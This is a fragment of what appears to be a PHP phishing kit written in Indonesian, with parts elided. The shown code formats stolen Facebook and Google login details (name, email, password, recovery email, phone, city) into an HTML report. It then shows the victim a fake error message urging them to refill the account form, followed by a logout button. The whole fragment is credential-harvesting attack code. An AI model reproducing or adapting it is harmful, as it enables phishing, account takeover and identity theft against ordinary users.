...
$body = <<<EOD
<br><hr><br>
<h2<b><font color="red"> >>>>>>Akun facebook<<<<<<</font></b></h2>
<br>
Nama : <font color="green">$Nama</font> 
<br>
Email : <font color="green">$Email</font> <br>
Password : <font color="red">$Pass</font> <br>
<br>
<h2<b><font color="red"> >>>>>>Akun Google<<<<<<</font></b></h2>
<br>
Email Recovery : <font
color="orange">$Email2</font>
<br>
Password : <font color="red">$Pass</font> <br>
No hp : <font color="purple">$Phone</font> <br>
Kota : <font color="blue">$Kota</font> <br>
EOD;
...
<div style="border:none;" class="btn btn-success btn-lg btn-block"><b><i class="fa fa-google-plus"></i>Maaf Terjadi Kesalahan</b></div>
...
<h4 >
  Maaf permintan ada belum bisa diproses Mohon isi daftar fomulir akun anda dengan lekap dan benar
Trima kasih 
  </h4><br/>
  <div style="width:100%" class="form-group">
  <a  href="logout.php" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit"> KELUAR </a>
</div>
